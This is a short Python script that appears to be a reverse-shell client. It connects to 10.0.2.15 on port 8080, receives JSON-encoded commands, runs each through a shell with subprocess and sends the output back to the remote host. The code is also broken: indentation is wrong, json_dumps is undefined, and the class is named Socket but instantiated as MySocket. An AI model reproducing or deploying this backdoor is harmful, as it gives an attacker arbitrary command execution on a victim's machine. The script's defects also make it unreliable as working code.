import socket
import subprocess
import json

class Socket:
	def __init__(self, ip, port):
	self.Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	self.Connection.connect((ip,port))


	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

#Connection.send('Connection Successful\n')

	def json_send(self, data):
		json_data = json_dumps(data)
		self.Connection.send(json_data)


	def json_receive(self):
		json_data = ''

		while True:
			try:
				json_data = json_data + self.Connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def start_socket(self):
		while True:

			command = self.json_receive()
			command_output = self.command_execution(command)

			self.json_send(command_output)

		self.Connection.close()

my_socket_object = MySocket('10.0.2.15', 8080)
my_socket_object.start_socket()
